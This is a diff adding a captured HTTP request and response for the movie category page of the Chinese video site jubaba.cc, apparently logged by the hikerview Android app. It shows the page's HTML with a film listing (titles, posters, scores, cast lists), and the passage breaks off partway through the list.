@@ -1,0 +1,478 @@
+Request
+GET https://www.jubaba.cc/vodtype/1.html HTTP/2
+sec-ch-ua: "Android WebView";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
+sec-ch-ua-mobile: ?1
+sec-ch-ua-platform: "Android"
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Linux; Android 16; 24129PN74C Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.115 Mobile Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+x-requested-with: com.example.hikerview
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+accept-encoding: gzip, deflate, br, zstd
+accept-language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+cookie: ewave-notice=1
+priority: u=0, i
+
+
+
+--------------------------------------------------------
+
+Response
+HTTP/2 200
+server: nginx
+date: Fri, 28 Nov 2025 04:10:22 GMT
+content-type: text/html; charset=utf-8
+vary: Accept-Encoding
+strict-transport-security: max-age=31536000
+content-encoding: gzip
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<!--视频分类页 vod/type -->
+<title>电影 - 第1页 - 剧爸爸</title>
+<meta name="keywords" content="电影,好看的电影,电影排行榜,最新电影" />
+<meta name="description" content="电影栏目收集整理最新好看的电影大全，提供电影排行榜推荐，为网友提供高画质的电影" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="referrer" content="no-referrer">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<link rel="shortcut icon" href="/template/jbb/img/favicon.png" type="image/x-icon" />
+<link rel="stylesheet" type="text/css" href="/template/jbb/css/iconfont.css?v=20230420"/>
+<link rel="stylesheet" type="text/css" href="/template/jbb/css/swiper-bundle.min.css?v=20230420"/>
+<link rel="stylesheet" type="text/css" href="/template/jbb/css/global.css?v=20230420"/>
+<link rel="stylesheet" type="text/css" href="/template/jbb/css/style.css?v=20230420"/>
+<script type="text/javascript">
+var maccms={"path":"","mid":"1","aid":"11","url":"www.jubaba.cc","wapurl":"www.jubaba.cc","mob_status":"0"};
+</script>
+<script type="text/javascript" src="/template/jbb/js/jquery.min.js?v=20230420"></script>
+<script type="text/javascript" src="/static/js/home.js?v=20230420"></script>
+<script type="text/javascript" src="/template/jbb/js/swiper-bundle.min.js?v=20230420"></script>
+<script type="text/javascript" src="/template/jbb/js/jquery.raty.js?v=20230420"></script>
+<script type="text/javascript" src="/template/jbb/js/functions.js?v=20230420"></script>
+<script type="text/javascript" src="/template/jbb/js/script.js?v=20230420"></script>
+</head>
+<body>
+<header class="ewave-header__top clearfix" id="header-top">
+  <div class="container">
+    <div class="row">
+      <div class="ewave-header_bd clearfix">
+        <div class="ewave-header__logo"> <a title="剧爸爸" class="logo" href="/"></a> </div>
+        <div class="ewave-header__side">
+          <ul class="ewave-header__user hidden-xs">
+            <li> <a href="javascript:;"><i class="icon iconfont icon-clock"></i></a>
+              <div class="dropdown history">
+                <h5 class="margin-0 text-muted"> <a class="historyclean text-muted pull-right" href="javascript:;">清空</a> 播放记录 </h5>
+                <ul class="clearfix" id="ewave_history">
+                </ul>
+              </div>
+            </li>
+          </ul>
+          <div class="ewave-header__search">
+            <form id="search" name="search" method="get" action="/vodsearch/-------------.html">
+              <input type="text" name="wd" class="form-control" value="" placeholder="请输入关键词..." autocomplete="off"/>
+              <button class="submit" id="searchbutton" type="submit"><i class="icon iconfont icon-search"></i></button>
+            </form>
+          </div>
+        </div>
+        <div class="ewave-header__menu nav-slide">
+          <ul class="swiper-wrapper">
+          <li class="swiper-slide"><a href="/">首页</a></li>
+                    <li class="swiper-slide active"><a href="/vodtype/1.html">电影</a></li>
+                    <li class="swiper-slide"><a href="/vodtype/2.html">剧集</a></li>
+                    <li class="swiper-slide"><a href="/vodtype/3.html">综艺</a></li>
+                    <li class="swiper-slide"><a href="/vodtype/4.html">动漫</a></li>
+                    <li class="swiper-slide"><a href="https://www.jubaba.vip/">发布页面</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+<div class="container">
+  <div class="row">
+    <div class="col-lg-wide-75 col-xs-1 padding-0">
+
+      <div class="ewave-pannel ewave-pannel-bg clearfix">
+        <div class="ewave-pannel-box"> 
+          <div class="ewave-pannel_hd">
+            <div class="ewave-pannel__head active bottom-line clearfix">
+              <ul class="nav nav-head">
+                <li class="active"><a href="">电影首页</a></li>
+                <li><a href="/vodshow/1-----------.html">电影库</a></li>
+              </ul>
+            </div>
+          </div>
+          <div class="ewave-pannel_bd">
+            <ul class="ewave-vodlist clearfix">
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="讨嫌的人" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2919310535.jpg" alt="讨嫌的人"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">10.0</span> <a class="thumb-link" href="/voddetail/89121.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/89121.html" title="讨嫌的人" >讨嫌的人</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">Rebeka Poláková Mantas Zemleckas 哈娜·瓦格内洛娃 巴博拉·伯布洛瓦 马丁·芬格 米罗斯拉夫·哈努斯 Tatjana Medvecká</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="奇遇" data-original="https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2920978322.jpg" alt="奇遇"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">1.0</span> <a class="thumb-link" href="/voddetail/87293.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/87293.html" title="奇遇" >奇遇</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">贾冰 王皓 李梦 郑合惠子 杨皓宇 翟子路 于洋 费启鸣 李乃文 马旭东 邓帅 李治良 冯满 郝瀚 李飞 小沈阳 徐浩伦 谭湘文 唐香玉</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="神奇柑仔店 真人版" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2912648744.jpg" alt="神奇柑仔店 真人版"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">6.0</span> <a class="thumb-link" href="/voddetail/85977.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/85977.html" title="神奇柑仔店 真人版" >神奇柑仔店 真人版</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">天海祐希 大桥和也 伊原六花 上白石萌音 平泽宏宏路 伊礼姬奈 白山乃爱 番家天嵩 今濱夕輝乃 山本未来 渡边圭祐 田中里衣 JIRO</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="圣诞老人-N：红色觉醒" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2927449906.jpg" alt="圣诞老人-N：红色觉醒"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">2.0</span> <a class="thumb-link" href="/voddetail/89690.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/89690.html" title="圣诞老人-N：红色觉醒" >圣诞老人-N：红色觉醒</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">谢尔比·斯旺森 保罗·A·罗西 小比利·约瑟夫</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="蔗噬" data-original="https://img2.doubanio.com/view/photo/s_ratio_poster/public/p2919538231.jpg" alt="蔗噬"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">4.0</span> <a class="thumb-link" href="/voddetail/89689.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/89689.html" title="蔗噬" >蔗噬</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">乔茜·朱丽叶特·沃特 Kellan Jackson Lacey Katena Michael Mau 邦妮·布鲁尔 Zach Ball Ashley Nicole Blake Haley Johnson 妮可·凯茨 Cullen Lovelock Kevin J. Stone Clarence Garner 贝内特·韦尔奇 Will Landis Cate Whitlatch</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="泻湖恶棍" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2927454656.jpg" alt="泻湖恶棍"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">8.0</span> <a class="thumb-link" href="/voddetail/89691.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/89691.html" title="泻湖恶棍" >泻湖恶棍</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">珍娜·卡兰 格雷格·多尔查克 托里·埃利斯</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="不速来客" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2687924214.jpg" alt="不速来客"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">10.0</span> <a class="thumb-link" href="/voddetail/58621.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/58621.html" title="不速来客" >不速来客</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">范伟 窦骁 张颂文 朱珠 梁超 胡明 高尚 蔡鹭</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="恶棍天使" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2298326979.jpg" alt="恶棍天使"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">10.0</span> <a class="thumb-link" href="/voddetail/34893.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/34893.html" title="恶棍天使" >恶棍天使</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">邓超 孙俪 代乐乐 梁超 杨新鸣 王砚辉 许可嘉 赵曼竹 栾元晖 张鹭 王双宝</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="欢乐喜剧人" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2449680079.jpg" alt="欢乐喜剧人"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">8.0</span> <a class="thumb-link" href="/voddetail/34152.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/34152.html" title="欢乐喜剧人" >欢乐喜剧人</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">郭德纲 岳云鹏 罗温·艾金森 艾伦 张小斐 潘斌龙 孙越 张泰维 伊万德·霍利菲尔德 陈国坤 李尚正 梁超 魏璐 陈米麒 赵文琪 吴思佳 陈苑澄 苏皓儿 陈嘉茵 孙笑一 付勇 艾克拜尔·黑血 雷鹏宇 夏海铭 任翔 周钰博 何平 张仟 颜敬杰</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="断片之险途夺宝" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2541553709.jpg" alt="断片之险途夺宝"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">10.0</span> <a class="thumb-link" href="/voddetail/33701.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/33701.html" title="断片之险途夺宝" >断片之险途夺宝</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">葛优 岳云鹏 杜淳 蔡卓妍 包贝尔 小沈阳 陈赫 潘斌龙 热依扎 孙越 吕行 张亮 奚梦瑶 杜志国 许君聪 吴俊余 武强</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="奇妙能力哥" data-original="https://img2.doubanio.com/view/photo/s_ratio_poster/public/p2879972891.jpg" alt="奇妙能力哥"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">8.0</span> <a class="thumb-link" href="/voddetail/58064.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/58064.html" title="奇妙能力哥" >奇妙能力哥</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">王元虎 姚晓棠 许慧强</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="热辣滚烫" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2904304396.jpg" alt="热辣滚烫"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">3.0</span> <a class="thumb-link" href="/voddetail/74127.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/74127.html" title="热辣滚烫" >热辣滚烫</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">贾玲 雷佳音 张小斐 杨紫 沙溢 乔杉 李雪琴 马丽 魏翔 赵海燕 张琪 沈春阳 沈涛 许君聪 卜钰 朱天福 刘宏禄 张泰维 郭宇鹏 李海银 李国麟 张桂玲 孙婉竹 赵婷婷 法志远 姬晴 曹贺军 刘頔 贾文田 雷鸣武</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="李茶的姑妈" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2533384240.jpg" alt="李茶的姑妈"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">9.0</span> <a class="thumb-link" href="/voddetail/33737.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/33737.html" title="李茶的姑妈" >李茶的姑妈</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">黄才伦 艾伦 宋阳 卢靖姗 沈腾 韩彦博 陈冰 张镨冉 王宇 赵雪 常远 王成思 张琛 魏玮 陶亮 朱微玮 芦莹 李海银 何子君 高海宝 刘坤 钱晨光 乌日塔 杨洁 向斐 何孟卓 王野苓 喜子 张琳</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="扫黑·决不放弃" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2907965629.jpg" alt="扫黑·决不放弃"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">4.0</span> <a class="thumb-link" href="/voddetail/77126.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/77126.html" title="扫黑·决不放弃" >扫黑·决不放弃</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">肖央 余皑磊 范丞丞 李诚儒 耿乐 杨皓宇 焦刚 石兆琪 李建义 刘欢 张艺凡 苇青 林乐炫 蒋诗萌</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="鼠胆英雄" data-original="https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2564458983.jpg" alt="鼠胆英雄"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">5.0</span> <a class="thumb-link" href="/voddetail/33377.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/33377.html" title="鼠胆英雄" >鼠胆英雄</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">岳云鹏 佟丽娅 田雨 袁弘 韩童生 蔡明 刘威 于谦 大鹏 雷佳音 于洋 华少 孙越 邢佳栋 李解 耿长军 孟瑶 张萌 常亮 郭丰周 桑平</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="鬼吹灯之精绝古城" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2878829260.jpg" alt="鬼吹灯之精绝古城"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">4.0</span> <a class="thumb-link" href="/voddetail/57639.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/57639.html" title="鬼吹灯之精绝古城" >鬼吹灯之精绝古城</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">于毅 付美 孔连顺</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="日常幻想指南" data-original="https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2681329662.jpg" alt="日常幻想指南"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">1.0</span> <a class="thumb-link" href="/voddetail/52338.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/52338.html" title="日常幻想指南" >日常幻想指南</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">王彦霖 焦俊艳 高捷 闵健 罗辑 张子栋 林更新 包贝尔 张海宇 曾江 阳蕾 张雪峰 大兵 梁缘 琥玛尔</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="走走停停" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2907440658.jpg" alt="走走停停"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">4.0</span> <a class="thumb-link" href="/voddetail/77523.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/77523.html" title="走走停停" >走走停停</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">胡歌 高圆圆 岳红 周野芒 金靖 刘钧 甘昀宸 刘仪伟 张鲁一 袁弘 王真儿 赫子铭 小爱 滕哲</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="我才不要和你做朋友呢" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2908694975.jpg" alt="我才不要和你做朋友呢"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">9.0</span> <a class="thumb-link" href="/voddetail/76913.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/76913.html" title="我才不要和你做朋友呢" >我才不要和你做朋友呢</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">庄达菲 陈昊宇 王皓 毕雯珺 贾冰 牛莉 杨皓宇 钱芳 车保罗 董思怡 王佳宝 闫强 万国鹏</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="看不见的朋友" data-original="https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2912845747.jpg" alt="看不见的朋友"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">1.0</span> <a class="thumb-link" href="/voddetail/72747.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/72747.html" title="看不见的朋友" >看不见的朋友</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">曾敬骅 邵雨薇 陆弈静 张再兴 蔡嘉茵 洪君昊  百白 谢坤达 陈博正 邓志鸿 郁方 张书豪 邱彦翔</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="青石镇传说" data-original="https://img2.doubanio.com/view/photo/s_ratio_poster/public/p2927448761.jpg" alt="青石镇传说"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">10.0</span> <a class="thumb-link" href="/voddetail/89642.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/89642.html" title="青石镇传说" >青石镇传说</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">曹卫宇 李培铭 胡亦瑶 张璐瑶 高凯</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="大话神捕" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2679969618.jpg" alt="大话神捕"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">9.0</span> <a class="thumb-link" href="/voddetail/52653.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/52653.html" title="大话神捕" >大话神捕</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">许君聪 卜钰 包贝尔 于洋 德柏 张经纬 张泰维 杨山 贺军 陈秋伶 张美伦 马翼</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="八星报喜" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2167152345.jpg" alt="八星报喜"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">4.0</span> <a class="thumb-link" href="/voddetail/51510.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/51510.html" title="八星报喜" >八星报喜</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">周润发 黄百鸣 张学友 钟楚红 郑裕玲 袁洁莹 冯宝宝 黄坤玄 李香琴 郑丹瑞</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="大丈夫日记" data-original="https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2258660233.jpg" alt="大丈夫日记"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">5.0</span> <a class="thumb-link" href="/voddetail/37953.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/37953.html" title="大丈夫日记" >大丈夫日记</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">周润发 王祖贤 叶倩文 李子雄 郑则仕 金燕玲 吴家丽 成奎安 太保 胡大为</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="大李小李和老李" data-original="https://img2.doubanio.com/view/photo/s_ratio_poster/public/p2459539322.jpg" alt="大李小李和老李"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">6.0</span> <a class="thumb-link" href="/voddetail/65874.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/65874.html" title="大李小李和老李" >大李小李和老李</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">刘侠声 范哈哈 姚德冰 关宏达 尤嘉 文彬彬 俞祥明 张小玲 嫩娘 王子平 汪宗良 蒋天流 任正佳 王小刚 石小满 傅明正 孙文铮</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="今天我休息" data-original="https://img2.doubanio.com/view/photo/s_ratio_poster/public/p2681735641.jpg" alt="今天我休息"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">1.0</span> <a class="thumb-link" href="/voddetail/36236.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/36236.html" title="今天我休息" >今天我休息</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">仲星火 上官云珠 马骥 李保罗</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="大侦探霍桑" data-original="https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2546253802.jpg" alt="大侦探霍桑"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">1.0</span> <a class="thumb-link" href="/voddetail/60554.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/60554.html" title="大侦探霍桑" >大侦探霍桑</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">韩庚 尹正 张慧雯 刘嘉玲 郭晓东 冯嘉怡 罗家英 王梓轩 于洋</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="开心鬼放暑假" data-original="https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1995005703.jpg" alt="开心鬼放暑假"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">10.0</span> <a class="thumb-link" href="/voddetail/49175.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/49175.html" title="开心鬼放暑假" >开心鬼放暑假</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">黄百鸣 袁洁莹 罗美薇 陈加玲 傅明宪 陈曼娜 邓寄尘 高志森 黄锦燊 梁柏坚 黎姿</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="开心鬼" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p1995000284.jpg" alt="开心鬼"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">10.0</span> <a class="thumb-link" href="/voddetail/49177.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/49177.html" title="开心鬼" >开心鬼</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">黄百鸣 罗明珠 李丽珍 高志森 杜丽莎 林珊珊</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="呆呆计划" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2403376386.jpg" alt="呆呆计划"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">7.0</span> <a class="thumb-link" href="/voddetail/34601.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/34601.html" title="呆呆计划" >呆呆计划</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">陈小春 邓家佳 汪东城 李凡秀 吴启华 张小觉 徐鸥仪 朴文熙 郭云飞 卢晋杰 单宝中 何军 朱丹青</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
